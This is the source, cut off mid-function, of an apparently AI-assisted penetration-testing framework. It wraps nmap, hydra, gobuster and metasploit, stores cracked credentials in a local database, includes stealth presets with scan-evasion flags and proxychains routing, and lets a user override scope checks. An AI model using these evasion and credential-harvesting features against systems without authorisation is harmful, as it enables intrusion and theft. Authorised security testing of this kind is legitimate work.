#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║        NiiX Scan  —  Multi-Distro Security Framework  v5.6               ║
# ║        Created by: cuteLiLi / techniix / QuacK                           ║
# ╚══════════════════════════════════════════════════════════════════════════╝
#
#  ⚠  LEGAL NOTICE ⚠
#  This tool is for authorised penetration testing and security research ONLY.
#  Unauthorised use against systems you do not own or have explicit written
#  permission to test is illegal under the CFAA, Computer Misuse Act, and
#  equivalent laws worldwide. You accept full legal responsibility for your use.
# ─────────────────────────────────────────────────────────────────────────────

import os, sys, re, subprocess, shutil, json, logging, time, platform
import tempfile, threading, textwrap, datetime, urllib.request, urllib.error
import ipaddress, sqlite3, hashlib, shlex, getpass
import xml.etree.ElementTree as ET
from pathlib import Path
from urllib.parse import urlparse

# ─── ANSI colours ──────────────────────────────────────────────────────────
R   = "\033[0m";   B   = "\033[1m";   DIM = "\033[2m"
CY  = "\033[38;5;51m";  GR  = "\033[38;5;82m";  YL  = "\033[38;5;220m"
RD  = "\033[38;5;196m"; MG  = "\033[38;5;213m";  BL  = "\033[38;5;33m"
WH  = "\033[97m";       OR  = "\033[38;5;208m";  PU  = "\033[38;5;135m"

logging.basicConfig(level=logging.WARNING,
    format=f"{DIM}[%(asctime)s]{R} %(levelname)s %(message)s", datefmt="%H:%M:%S")
logger = logging.getLogger("niixscan")

# ══════════════════════════════════════════════════════════════════════════════
#  SESSION STATE  — shared across the whole run
# ══════════════════════════════════════════════════════════════════════════════
SESSION = {
    "authorized"  : False,   # consent gate
    "target"      : "",      # current target
    "api_key"     : "",      # Kimi (Moonshot AI) API key
    "scan_results": {},      # tool_name → raw output
    "ai_report"   : None,    # last AI analysis dict
    "exploit_log" : [],      # outcomes of exploitation attempts (for AI feedback)
}

# ══════════════════════════════════════════════════════════════════════════════
#  SCOPE ENFORCEMENT  — every target is checked before any packet is sent
# ══════════════════════════════════════════════════════════════════════════════
_SCOPE_FILE = Path.home() / ".config" / "niixscan" / "scope.txt"

def load_scope():
    """Read scope.txt → (in_scope_nets/domains, out_of_scope). Lines starting
    with '!' are exclusions. Empty file = scope disabled (gate only)."""
    includes, excludes = [], []
    if not _SCOPE_FILE.exists():
        return includes, excludes
    for line in _SCOPE_FILE.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        (excludes if line.startswith("!") else includes).append(line.lstrip("!"))
    return includes, excludes

def _target_in_entry(target, entry) -> bool:
    """Match target (IP/host/CIDR/domain/URL) against one scope entry."""
    t = urlparse(target).hostname or target if "://" in target else target
    t = t.strip().lower().rstrip("/")
    e = entry.lower().rstrip("/")
    if not t:
        return False
    # CIDR / IP matching
    try:
        if "/" in e:
            return ipaddress.ip_address(t) in ipaddress.ip_network(e, strict=False)
        ipaddress.ip_address(e)
        return t == e
    except ValueError:
        pass
    # Plain IP target vs hostname entry can't match
    try:
        ipaddress.ip_address(t)
        return False
    except ValueError:
        pass
    # Domain suffix match: example.com covers sub.example.com
    return t == e or t.endswith("." + e)

def check_scope(target) -> bool:
    """Return True if target may be scanned. If a scope file exists with
    includes, target must match an include and no exclusion."""
    includes, excludes = load_scope()
    if not includes and not excludes:
        return True                      # no scope file → rely on consent gate
    for ex in excludes:
        if _target_in_entry(target, ex):
            return False
    if not includes:
        return True
    return any(_target_in_entry(target, inc) for inc in includes)

def scope_guard(target) -> bool:
    """Interactive guard used by tools before running."""
    if check_scope(target):
        return True
    msg_err(f"TARGET OUT OF SCOPE: {target}")
    msg_wrn(f"Edit your scope file: {_SCOPE_FILE}")
    msg_wrn("Lines = in-scope CIDRs/domains, '!' prefix = exclusion.")
    return confirm("Override scope and proceed anyway (you are responsible)")

# ══════════════════════════════════════════════════════════════════════════════
#  FINDINGS DATABASE  (SQLite — survives restarts, feeds reports & AI)
# ══════════════════════════════════════════════════════════════════════════════
_DB = Path.home() / ".config" / "niixscan" / "findings.db"

def db():
    _DB.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(str(_DB))
    conn.executescript("""
    CREATE TABLE IF NOT EXISTS hosts(
        host TEXT PRIMARY KEY, os_guess TEXT, first_seen TEXT, last_seen TEXT);
    CREATE TABLE IF NOT EXISTS ports(
        host TEXT, port INTEGER, proto TEXT, service TEXT, version TEXT,
        last_seen TEXT, PRIMARY KEY(host, port, proto));
    CREATE TABLE IF NOT EXISTS vulns(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        host TEXT, vuln_id TEXT, title TEXT, severity TEXT,
        source TEXT, evidence TEXT, first_seen TEXT, UNIQUE(host, vuln_id, source));
    CREATE TABLE IF NOT EXISTS creds(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        host TEXT, service TEXT, username TEXT, password TEXT,
        source TEXT, first_seen TEXT, UNIQUE(host, service, username));
    """)
    return conn

def _now(): return datetime.datetime.now().isoformat(timespec="seconds")

def db_add_host(host, os_guess=None):
    with db() as c:
        c.execute("INSERT INTO hosts(host,os_guess,first_seen,last_seen) VALUES(?,?,?,?) "
                  "ON CONFLICT(host) DO UPDATE SET last_seen=excluded.last_seen, "
                  "os_guess=COALESCE(excluded.os_guess, hosts.os_guess)",
                  (host, os_guess, _now(), _now()))

def db_add_port(host, port, proto, service="", version=""):
    with db() as c:
        c.execute("INSERT OR REPLACE INTO ports VALUES(?,?,?,?,?,?)",
                  (host, port, proto, service, version, _now()))

def db_add_vuln(host, vuln_id, title, severity, source, evidence=""):
    with db() as c:
        c.execute("INSERT OR IGNORE INTO vulns(host,vuln_id,title,severity,source,evidence,first_seen) "
                  "VALUES(?,?,?,?,?,?,?)",
                  (host, vuln_id, title, severity, source, evidence[:500], _now()))

def db_add_cred(host, service, username, password, source):
    with db() as c:
        c.execute("INSERT OR IGNORE INTO creds(host,service,username,password,source,first_seen) "
                  "VALUES(?,?,?,?,?,?)", (host, service, username, password, source, _now()))

def db_creds_for(host):
    with db() as c:
        return c.execute("SELECT service,username,password FROM creds WHERE host=?",
                         (host,)).fetchall()

def db_summary(host=None):
    with db() as c:
        q = lambda sql, *a: c.execute(sql, a).fetchall()
        if host:
            return {"ports": q("SELECT port,proto,service,version FROM ports WHERE host=? ORDER BY port", host),
                    "vulns": q("SELECT vuln_id,title,severity,source FROM vulns WHERE host=?", host),
                    "creds": q("SELECT service,username,password,source FROM creds WHERE host=?", host)}
        return {"hosts": q("SELECT host,os_guess,last_seen FROM hosts ORDER BY last_seen DESC"),
                "vulns": q("SELECT host,vuln_id,severity,source FROM vulns ORDER BY first_seen DESC"),
                "creds": q("SELECT host,service,username FROM creds")}

# ══════════════════════════════════════════════════════════════════════════════
#  SCAN INTENSITY PRESETS
# ══════════════════════════════════════════════════════════════════════════════
PRESETS = {
    "stealth":    {"nmap_timing": "-T2", "masscan_rate": "100",  "hydra_threads": "4",  "gobuster_threads": "5",  "gobuster_delay": "500ms",
                   "nmap_evasion": ["-D","RND:8","--scan-delay","1s","-f","--source-port","53"]},
    "normal":     {"nmap_timing": "-T4", "masscan_rate": "1000", "hydra_threads": "16", "gobuster_threads": "20", "gobuster_delay": "",
                   "nmap_evasion": []},
    "aggressive": {"nmap_timing": "-T5", "masscan_rate": "10000","hydra_threads": "32", "gobuster_threads": "50", "gobuster_delay": "",
                   "nmap_evasion": []},
}

def active_preset() -> dict:
    name = "normal"
    try: name = load_cfg().get("preset", "normal")
    except Exception: pass
    return PRESETS.get(name, PRESETS["normal"])

def preset_name() -> str:
    try: return load_cfg().get("preset", "normal")
    except Exception: return "normal"

def maybe_proxy(cmd):
    """Prefix command with proxychains when enabled in settings and installed."""
    try:
        if load_cfg().get("proxychains"):
            pc = shutil.which("proxychains4") or shutil.which("proxychains")
            if pc:
                return [pc, "-q"] + cmd
    except Exception:
        pass
    return cmd

# ══════════════════════════════════════════════════════════════════════════════
#  DISTRO DETECTION
# ══════════════════════════════════════════════════════════════════════════════
def detect_distro():
    if not sys.platform.startswith("linux"):
        sys.exit(f"{RD}[!]{R} NiiX Scan requires Linux.")
    info = {}
    osr = Path("/etc/os-release")
    if osr.exists():
        for line in osr.read_text().splitlines():
            if "=" in line:
                k, v = line.split("=", 1)
                info[k.strip()] = v.strip().strip('"')
    ident = (info.get("ID","") + " " + info.get("ID_LIKE","")).lower()
    if any(x in ident for x in ("arch","manjaro","endeavour","garuda","artix")):
        return "arch",  "pacman", ["sudo","pacman","-S","--noconfirm","--needed"]
    if any(x in ident for x in ("fedora","rhel","centos","rocky","alma","nobara")):
        mgr = "dnf" if shutil.which("dnf") else "yum"
        return "fedora", mgr, ["sudo", mgr, "install", "-y"]
    if any(x in ident for x in ("debian","ubuntu","mint","kali","pop","zorin","parrot")):
        return "debian", "apt", ["sudo","apt-get","install","-y"]
    for pm, cmd in [("apt",["sudo","apt-get","install","-y"]),
                    ("dnf",["sudo","dnf","install","-y"]),
                    ("pacman",["sudo","pacman","-S","--noconfirm","--needed"])]:
        if shutil.which(pm): return "unknown", pm, cmd
    sys.exit(f"{RD}[!]{R} No supported package manager found.")

DISTRO_FAMILY, PKG_MGR, INSTALL_CMD = detect_distro()

# ══════════════════════════════════════════════════════════════════════════════
#  PACKAGE MAPS
# ══════════════════════════════════════════════════════════════════════════════
_PKG = {
    "git"         : {"arch":"git",                 "debian":"git",                "fedora":"git"},
    "wget"        : {"arch":"wget",                "debian":"wget",               "fedora":"wget"},
    "curl"        : {"arch":"curl",                "debian":"curl",               "fedora":"curl"},
    "pip"         : {"arch":"python-pip",          "debian":"python3-pip",        "fedora":"python3-pip"},
    "nmap"        : {"arch":"nmap",                "debian":"nmap",               "fedora":"nmap"},
    "nikto"       : {"arch":"nikto",               "debian":"nikto",              "fedora":"nikto"},
    "whois"       : {"arch":"whois",               "debian":"whois",              "fedora":"whois"},
    "dnsutils"    : {"arch":"bind",                "debian":"dnsutils",           "fedora":"bind-utils"},
    "traceroute"  : {"arch":"traceroute",          "debian":"traceroute",         "fedora":"traceroute"},
    "hydra"       : {"arch":"hydra",               "debian":"hydra",              "fedora":"hydra"},
    "masscan"     : {"arch":"masscan",             "debian":"masscan",            "fedora":"masscan"},
    "gobuster"    : {"arch":"gobuster",            "debian":"gobuster",           "fedora":"gobuster"},
    "metasploit"  : {"arch":"metasploit",          "debian":"metasploit-framework","fedora":"metasploit-framework"},
    "unzip"       : {"arch":"unzip",               "debian":"unzip",              "fedora":"unzip"},
    "tar"         : {"arch":"tar",                 "debian":"tar",                "fedora":"tar"},
}

def _pkg(key):
    return _PKG.get(key, {}).get(DISTRO_FAMILY, key) or key

def _run_q(cmd):
    return subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)

def _run(cmd, **kw):
    return subprocess.run(cmd, **kw)

def _apt_update():
    if DISTRO_FAMILY == "debian":
        _run_q(["sudo","apt-get","update","-qq"])

def install_pkg(*keys):
    pkgs = [_pkg(k) for k in keys if _pkg(k)]
    if pkgs: _run_q(INSTALL_CMD + pkgs)

def ensure_base():
    _apt_update()
    install_pkg("git","wget","curl","pip","unzip","tar")

# ══════════════════════════════════════════════════════════════════════════════
#  TERMINAL HELPERS
# ══════════════════════════════════════════════════════════════════════════════
def _W(): return shutil.get_terminal_size((100, 24)).columns
def clear():
    if os.environ.get("TERM"):
        os.system("clear")
def hline(char="─", col=CY): return f"{col}{char*_W()}{R}"

# ══════════════════════════════════════════════════════════════════════════════
#  RAINBOW ASCII BANNER  — always printed at top of every screen
# ══════════════════════════════════════════════════════════════════════════════

# The raw ASCII art lines (preserved exactly as supplied)
_ASCII_LINES = [
    r" ____               O         O       ____                ''       '                                ___         ____              ",
    r"|\    \  ____    ____    ____  |    |  ___        °    ___          ____       /   /|__  |\    \  ____   ",
    r" \|        \|    |  |\    \ |\    \ |\      \/   /|    ___|     |  ___|\   \`      /      /\   \` \|        \|    |  ",
    r"  /       /\      |  \|       | \|       | |\;`            /'/   (  (|___|'/    /\___\    |    |_|     | /       /\      |  ",
    r" |      | \|____|  /       /| /       /|  \/      /\      \    |   |)   )|        |'\|'    |_  |      | |  |      | \|____|  ",
    r" |\____\ |'   '  | |       |/ |       |/   |___| \:\`    \`|___||   |"r"|\____\/    /|`|      | |      `| |\____\ |'   '  | ",
    r"  \|'   '  |   ~~~~|\____\ |\____\   |'  |   \|___||'   | ~~~~   \|'   ' /____/;/ |\___\|        | \|'   '  |   ~~~~",
    r"     ~~~~           \|'   '  | \|'   '  |   ~~~      |'   '|` ~~~       '      ~~~|'   '   |/   \|'    |/___/|    ~~~~            ",
    r"            '           ~~~~     ~~~~                  ~~~~     '    '    '                ~~~~        ~~|'    ~|/''           '     ",
    r"            '                          '            '     ``                    ''     '         '        '         '        ~~~~  `   '",
]

# 256-colour rainbow palette — cycles through vivid hues per character
_RAINBOW_COLS = [
    "\033[38;5;196m",  # red
    "\033[38;5;202m",  # orange-red
    "\033[38;5;208m",  # orange
    "\033[38;5;214m",  # yellow-orange
    "\033[38;5;220m",  # yellow
    "\033[38;5;154m",  # yellow-green
    "\033[38;5;82m",   # green
    "\033[38;5;48m",   # spring green
    "\033[38;5;51m",   # cyan
    "\033[38;5;39m",   # sky blue
    "\033[38;5;27m",   # blue
    "\033[38;5;57m",   # blue-violet
    "\033[38;5;93m",   # violet
    "\033[38;5;129m",  # purple
    "\033[38;5;165m",  # magenta-purple
    "\033[38;5;201m",  # magenta
    "\033[38;5;207m",  # hot pink
    "\033[38;5;213m",  # pink
]

# Offset shifts per line so colours cascade diagonally across the art
_LINE_OFFSETS = [0, 3, 6, 9, 12, 15, 11, 7, 4, 1]

def _rainbow_line(text: str, offset: int = 0) -> str:
    """Colour each character with a cycling rainbow palette."""
    out = []
    ci  = offset
    for ch in text:
        if ch == " ":
            out.append(ch)
        else:
            col = _RAINBOW_COLS[ci % len(_RAINBOW_COLS)]
            out.append(f"{B}{col}{ch}{R}")
            ci += 1
    return "".join(out)

def banner():
    clear()
    w = _W()

    # ── Rainbow ASCII art ────────────────────────────────────────────
    for i, line in enumerate(_ASCII_LINES):
        offset = _LINE_OFFSETS[i % len(_LINE_OFFSETS)]
        coloured = _rainbow_line(line, offset)
        # Centre based on raw (no ANSI) length
        raw_len = len(line)
        pad     = max(0, (w - raw_len) // 2)
        print(" " * pad + coloured)

    # ── Status bar ────────────────────────────────────────────────────
    ai_status   = f"{GR}{B}AI ARMED{R}"   if SESSION["api_key"]   else f"{DIM}AI OFFLINE{R}"
    auth_status = f"{GR}{B}AUTHORIZED{R}" if SESSION["authorized"] else f"{RD}{B}UNAUTHORIZED{R}"
    target_str  = SESSION["target"] if SESSION["target"] else "none"

    print()
    # thin rainbow rule
    rule_chars = "━" * w
    rule_out   = []
    for ci, ch in enumerate(rule_chars):
        col = _RAINBOW_COLS[ci % len(_RAINBOW_COLS)]
        rule_out.append(f"{col}{ch}{R}")
    print("".join(rule_out))

    info_line = (f"  {DIM}AI:{R} {ai_status}   "
                 f"{DIM}Auth:{R} {auth_status}   "
                 f"{DIM}Target:{R} {CY}{target_str}{R}   "
                 f"{DIM}{DISTRO_FAMILY.upper()} / {PKG_MGR.upper()}{R}  ")
    plain_len = len(re.sub(r'\033\[[0-9;]*m', '', info_line))
    lpad = max(0, (w - plain_len) // 2)
    print(" " * lpad + info_line)

    print("".join(rule_out))
    print()

def msg_ok(s):   print(f"  {GR}{B}✔{R} {s}")
def msg_err(s):  print(f"  {RD}{B}✗{R} {s}")
def msg_inf(s):  print(f"  {CY}{B}»{R} {s}")
def msg_wrn(s):  print(f"  {YL}{B}!{R} {s}")
def msg_ai(s):   print(f"  {PU}{B}🤖{R} {s}")

def pause():
    try: input(f"\n  {DIM}Press ENTER to continue …{R}")
    except EOFError: pass          # non-interactive (cron) — don't block

def ask(prompt, default=""):
    try:
        v = input(f"  {CY}?{R} {prompt}{DIM} [{default}]{R}: ").strip()
    except EOFError:
        return default             # non-interactive — take the default
    return v if v else default

def confirm(prompt):
    try:
        return input(f"  {YL}?{R} {prompt} {DIM}[y/N]{R}: ").strip().lower() in ("y","yes")
    except EOFError:
        return False               # non-interactive — default to NO

def validate_url(u):
    try:
        r = urlparse(u)
        return bool(r.scheme and r.netloc)
    except Exception:
        return False

def wrap_print(text, indent=4, width=None):
    w = (width or _W()) - indent
    for para in text.split("\n"):
        if para.strip() == "":
            print()
            continue
        for line in textwrap.wrap(para, width=w):
            print(" " * indent + line)

# ══════════════════════════════════════════════════════════════════════════════
#  PROGRESS BAR + SPINNER
# ══════════════════════════════════════════════════════════════════════════════
def _draw_bar(pct, label="", bar_w=48):
    pct    = max(0, min(100, int(pct)))
    filled = int(bar_w * pct / 100)
    bar    = f"{GR}{'█'*filled}{DIM}{'░'*(bar_w-filled)}{R}"
    lbl    = (label[:50]+"…") if len(label) > 50 else label
    print(f"\r  {bar} {CY}{B}{pct:>3}%{R}  {DIM}{lbl:<52}{R}", end="", flush=True)

_sp_active = False; _sp_thread = None; _sp_label = ""
_SP = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]

def _sp_worker():
    i = 0
    while _sp_active:
        lbl = (_sp_label[:65]+"…") if len(_sp_label) > 65 else _sp_label
        print(f"\r  {CY}{_SP[i%len(_SP)]}{R}  {DIM}{lbl:<68}{R}", end="", flush=True)
        i += 1; time.sleep(0.09)

def spinner_start(label="Working …"):
    global _sp_active, _sp_thread, _sp_label
    _sp_label = label; _sp_active = True
    _sp_thread = threading.Thread(target=_sp_worker, daemon=True)
    _sp_thread.start()

def spinner_stop(ok="Done."):
    global _sp_active
    _sp_active = False
    if _sp_thread: _sp_thread.join(timeout=0.5)
    print(f"\r  {GR}✔{R}  {ok:<70}")

# ══════════════════════════════════════════════════════════════════════════════
#  GITHUB BINARY DOWNLOADER
# ══════════════════════════════════════════════════════════════════════════════
def _arch():
    m = platform.machine().lower()
    if m in ("x86_64","amd64"):   return "amd64"
    if m in ("aarch64","arm64"):  return "arm64"
    if m in ("i386","i686"):      return "386"
    return "amd64"

def _verify_checksum(archive: str, asset_name: str, assets: list, tmp: str):
    """Verify SHA-256 of a downloaded release archive when the project
    publishes a checksums manifest. Warns loudly when it can't be verified."""
    manifest_url = None
    for a in assets:
        if re.search(r"(checksums?|sha256sums?|\.sha256)", a["name"], re.IGNORECASE):
            manifest_url = a["browser_download_url"]; break
    if not manifest_url:
        msg_wrn(f"No checksum manifest published for {asset_name} — "
                f"binary integrity could NOT be verified.")
        if not confirm("Install this unverified binary anyway"):
            raise RuntimeError("Aborted: unverified binary.")
        return
    try:
        manifest = os.path.join(tmp, "checksums.txt")
        urllib.request.urlretrieve(manifest_url, manifest)
        expected = None
        for line in Path(manifest).read_text(errors="replace").splitlines():
            if asset_name in line:
                expected = re.split(r"\s+", line.strip())[0]; break
        if not expected:
            raise RuntimeError(f"{asset_name} not listed in checksums manifest.")
        actual = hashlib.sha256(Path(archive).read_bytes()).hexdigest()
        if actual.lower() != expected.lower():
            raise RuntimeError(
                f"CHECKSUM MISMATCH for {asset_name}!\n"
                f"  expected {expected}\n  got      {actual}\n"
                f"  The download may be corrupted or tampered with — aborting.")
        msg_ok(f"SHA-256 verified for {asset_name}")
    except RuntimeError:
        raise
    except Exception as e:
        msg_wrn(f"Checksum verification failed ({e}) — could NOT verify binary.")
        if not confirm("Install this unverified binary anyway"):
            raise RuntimeError("Aborted: unverified binary.")

def install_github_binary(repo, asset_pattern, binary_name, dest="/usr/local/bin"):
    arch    = _arch()
    pattern = asset_pattern.format(arch=arch)
    api_url = f"https://api.github.com/repos/{repo}/releases/latest"
    msg_inf(f"Fetching latest release for {repo} …")
    req = urllib.request.Request(api_url,
        headers={"Accept":"application/vnd.github+json","User-Agent":"niixscan/4"})
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            data = json.loads(resp.read())
    except Exception as e:
        raise RuntimeError(f"GitHub API error: {e}")

    tag = data.get("tag_name","?")
    asset_url = asset_name = None
    for asset in data.get("assets",[]):
        if re.search(pattern, asset["name"], re.IGNORECASE):
            asset_url = asset["browser_download_url"]
            asset_name = asset["name"]; break

    if not asset_url:
        avail = [a["name"] for a in data.get("assets",[])]
        raise RuntimeError(f"No asset matching '{pattern}' in {repo} {tag}.\n  Available: {avail}")

    bar_w = min(44, _W()-30)
    def _hook(c, b, t):
        if t > 0: _draw_bar(min(int(c*b*100/t), 100), f"↓ {asset_name}", bar_w)

    with tempfile.TemporaryDirectory() as tmp:
        archive = os.path.join(tmp, asset_name)
        print(f"  {CY}↓{R}  {asset_name}  {DIM}({tag}){R}")
        try:
            urllib.request.urlretrieve(asset_url, archive, reporthook=_hook)
        except Exception as e:
            raise RuntimeError(f"Download failed: {e}")
        print()

        # ── Checksum verification (supply-chain guard) ──────────────
        _verify_checksum(archive, asset_name, data.get("assets", []), tmp)
        if asset_name.endswith((".tar.gz",".tgz")): _run_q(["tar","-xzf",archive,"-C",tmp])
        elif asset_name.endswith(".zip"):             _run_q(["unzip","-q",archive,"-d",tmp])
        found = None
        for root, _, files in os.walk(tmp):
            if binary_name in files: found = os.path.join(root, binary_name); break
        if not found: raise RuntimeError(f"'{binary_name}' not found in archive.")
        dest_path = os.path.join(dest, binary_name)
        _run(["sudo","cp",found,dest_path], check=True)
        _run(["sudo","chmod","+x",dest_path], check=True)
    msg_ok(f"{binary_name} {tag} → {dest_path}")

# ══════════════════════════════════════════════════════════════════════════════
#  LIVE SCAN RUNNER  (captures output for AI + shows progress bar)
# ══════════════════════════════════════════════════════════════════════════════
_BLOCK_PAT = re.compile(
    r"(connection (timed out|refused|reset)|too many errors|rate.?limit|"
    r"\b403\b|\b429\b|waf|blocked|captcha|access denied|banned)", re.IGNORECASE)

def run_scan(cmd, label, pct_fn=None, total_lines=0, show_output=True,
             capture_key=None, timeout=None):
    """
    Run cmd, show live progress bar/spinner, optionally store output in
    SESSION["scan_results"][capture_key] for later AI analysis.
    - timeout: seconds before the process is killed (partial output kept);
      defaults to Settings → scan_timeout (0 = no limit).
    - Watches for signs the target is blocking/rate-limiting us and warns.
    Returns (returncode, captured_output_str).
    """
    print(f"\n  {CY}►{R} {B}{label}{R}")
    print(hline())

    if timeout is None:
        try: timeout = int(load_cfg().get("scan_timeout", 0)) or None
        except Exception: timeout = None

    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                             text=True, bufsize=1)

    use_bar = bool(pct_fn or total_lines)
    bar_w   = min(50, _W()-28)
    n_lines = 0; last_pct = 0
    captured = []
    block_hits = 0; blocked_warned = False
    started = time.time(); timed_out = False

    try:
        for raw in iter(proc.stdout.readline, ""):
            if timeout and (time.time() - started) > timeout:
                proc.terminate(); timed_out = True
                try: proc.wait(timeout=5)
                except subprocess.TimeoutExpired: proc.kill()
                print(f"\n  {YL}⏱  Timeout after {timeout}s — partial results kept.{R}")
                break
            line = raw.rstrip()
            if not line: continue
            n_lines += 1
            captured.append(line)

            if _BLOCK_PAT.search(line):
                block_hits += 1
            if block_hits >= 8 and not blocked_warned:
                blocked_warned = True
                print(f"\n  {RD}{B}⚠ Possible blocking/rate-limiting detected "
                      f"({block_hits} error lines). Consider the 'stealth' preset "
                      f"or a proxy — results may be incomplete.{R}")

            pct = pct_fn(line) if pct_fn else None
            if pct is None and total_lines:
                pct = min(int(n_lines * 100 / total_lines), 99)

            if pct is not None:
                pct = max(last_pct, min(int(pct), 100)); last_pct = pct
                _draw_bar(pct, line[:55], bar_w)
            else:
                if use_bar:
                    trunc = (line[:_W()-8]+"…") if len(line) > _W()-8 else line
                    print(f"\r  {DIM}{trunc:<{_W()-4}}{R}", end="", flush=True)
                elif show_output:
                    print(f"  {DIM}{line}{R}")
    except KeyboardInterrupt:
        proc.terminate()
        print(f"\n  {YL}Scan interrupted.{R}")

    try:
        proc.stdout.close(); proc.wait(timeout=10)
    except Exception:
        proc.kill()
    if use_bar:
        _draw_bar(100, "Complete ✔", bar_w); print()

    rc = proc.returncode if not timed_out else -9
    if rc and rc != 0: msg_wrn(f"Process exited with code {rc}")
    print(hline())

    output_str = "\n".join(captured)
    if capture_key:
        SESSION["scan_results"][capture_key] = output_str
        _checkpoint()   # auto-save session state after every scan
    return rc, output_str

# ══════════════════════════════════════════════════════════════════════════════
#  PER-TOOL % EXTRACTORS
# ══════════════════════════════════════════════════════════════════════════════
def _pct_nmap(l):
    m = re.search(r"About\s+([\d.]+)%\s+done", l)
    return int(float(m.group(1))) if m else None

def _pct_masscan(l):
    m = re.search(r"([\d.]+)%\s+done", l)
    return int(float(m.group(1))) if m else None

def _pct_gobuster(l):
    m = re.search(r"Progress:\s*(\d+)\s*/\s*(\d+)", l)
    if m: return int(int(m.group(1))*100/max(int(m.group(2)),1))
    m = re.search(r"\(([\d.]+)%\)", l)
    return int(float(m.group(1))) if m else None

def _pct_hydra(l):
    m = re.search(r"\[STATUS\]\s+(\d+)\s+tries.*?(\d+)\s+to go", l)
    if m:
        d = int(m.group(1)); left = int(m.group(2)); tot = d+left
        return int(d*100/tot) if tot else None
    return None

def _pct_sqlmap(l):
    phases = ["testing connection","fetching","testing if","heuristic",
              "checking","parsing","retrieved","identified","target appears","back-end DBMS"]
    ll = l.lower()
    for i, p in enumerate(phases):
        if p in ll: return int((i+1)*100/len(phases))
    return None

def _pct_nuclei(l):
    m = re.search(r"Requests:\s*(\d+)\s*/\s*(\d+)", l, re.IGNORECASE)
    if m: return int(int(m.group(1))*100/max(int(m.group(2)),1))
    m2 = re.search(r"(\d{1,3})%", l)
    return int(m2.group(1)) if m2 else None

def _pct_nikto(l):
    m = re.search(r"(\d+)/(\d+)\s+items", l, re.IGNORECASE)
    if m: return int(int(m.group(1))*100/max(int(m.group(2)),1))
    return None

# ══════════════════════════════════════════════════════════════════════════════
#  STRUCTURED OUTPUT PARSERS  → findings DB
# ══════════════════════════════════════════════════════════════════════════════
def parse_nmap_xml(xml_path: str, host_hint: str = ""):
    """Parse nmap -oX output into the findings DB."""
    try:
        root = ET.parse(xml_path).getroot()
    except Exception as e:
        msg_wrn(f"nmap XML parse failed: {e}"); return
    for host_el in root.iter("host"):
        addr_el = host_el.find("address")
        if addr_el is None: continue
        host = addr_el.get("addr", host_hint)
        os_guess = None
        os_el = host_el.find("os/osmatch")
        if os_el is not None: os_guess = os_el.get("name")
        db_add_host(host, os_guess)
        for p in host_el.iter("port"):
            if p.find("state") is None or p.find("state").get("state") != "open":
                continue
            svc = p.find("service")
            db_add_port(host, int(p.get("portid")), p.get("protocol", "tcp"),
                        svc.get("name", "") if svc is not None else "",
                        (svc.get("product", "") + " " + svc.get("version", "")).strip()
                        if svc is not None else "")
        for script in host_el.iter("script"):
            sid = script.get("id", "")
            if "vuln" in sid.lower():
                db_add_vuln(host, sid, sid, "medium", "nmap", script.get("output", "")[:400])

def parse_nuclei_line(line: str, host_hint: str = ""):
    """Parse one nuclei -jsonl line into the findings DB."""
    try:
        d = json.loads(line)
    except Exception:
        return
    info = d.get("info", {})
    host = d.get("host") or host_hint
    host = urlparse(host).hostname or host
    db_add_vuln(host, d.get("template-id", "nuclei"),
                info.get("name", "nuclei finding"),
                info.get("severity", "info"), "nuclei",
                d.get("matched-at", ""))

_HYDRA_HIT = re.compile(r"\[(\w+)\]\s+host:\s*(\S+)\s+login:\s*(\S+)\s+password:\s*(\S*)")

def parse_hydra_creds(output: str):
    """Extract cracked credentials from hydra -V output into the DB."""
    n = 0
    for svc, host, user, pw in _HYDRA_HIT.findall(output):
        db_add_cred(host, svc, user, pw, "hydra"); n += 1
    if n:
        msg_ok(f"{n} credential(s) stored in the findings DB — "
               f"they'll be offered during exploitation.")

def nmap_xml_scan(cmd, xml_path, *args, **kw):
    """Run nmap with -oX and parse results into the DB afterwards."""
    full = cmd + ["-oX", xml_path]
    rc, out = run_scan(full, *args, **kw)
    if Path(xml_path).exists():
        parse_nmap_xml(xml_path, SESSION.get("target", ""))
    return rc, out

# ══════════════════════════════════════════════════════════════════════════════
#  SESSION CHECKPOINT  (auto-saved after every scan; resumable)
# ══════════════════════════════════════════════════════════════════════════════
_CKPT = Path.home() / ".config" / "niixscan" / "session.json"

def _checkpoint():
    try:
        _CKPT.parent.mkdir(parents=True, exist_ok=True)
        _CKPT.write_text(json.dumps({
            "target": SESSION["target"],
            "scan_results": SESSION["scan_results"],
            "ai_report": SESSION["ai_report"],
            "exploit_log": SESSION["exploit_log"],
            "saved": _now(),
        }))
    except Exception:
        pass

def restore_checkpoint() -> bool:
    if not _CKPT.exists():
        msg_err("No saved session found."); return False
    try:
        d = json.loads(_CKPT.read_text())
        SESSION["target"]       = d.get("target", "")
        SESSION["scan_results"] = d.get("scan_results", {})
        SESSION["ai_report"]    = d.get("ai_report")
        SESSION["exploit_log"]  = d.get("exploit_log", [])
        msg_ok(f"Session restored (saved {d.get('saved','?')}) — "
               f"{len(SESSION['scan_results'])} scan result set(s).")
        return True
    except Exception as e:
        msg_err(f"Restore failed: {e}"); return False

# ══════════════════════════════════════════════════════════════════════════════
#  ██████████  KIMI AI ENGINE  ██████████
# ══════════════════════════════════════════════════════════════════════════════
KIMI_API_DEFAULT = "https://api.moonshot.ai/v1/chat/completions"
KIMI_MODEL       = "kimi-k2.6"   # default; overridden by Settings → Kimi model

def _active_model() -> str:
    """Return the model configured in Settings, falling back to the default."""
    try:
        return load_cfg().get("model") or KIMI_MODEL
    except Exception:
        return KIMI_MODEL

def _active_api_url() -> str:
    """Return the chat-completions endpoint configured in Settings."""
    try:
        return load_cfg().get("api_base") or KIMI_API_DEFAULT
    except Exception:
        return KIMI_API_DEFAULT

def _kimi_request(system_prompt: str, user_msg: str,
                  max_tokens: int = 4096) -> str:
    """
    Send a request to the Kimi (Moonshot AI) OpenAI-compatible
    chat completions API. Returns the assistant message text.
    Retries transient failures (429 / 5xx) with backoff.
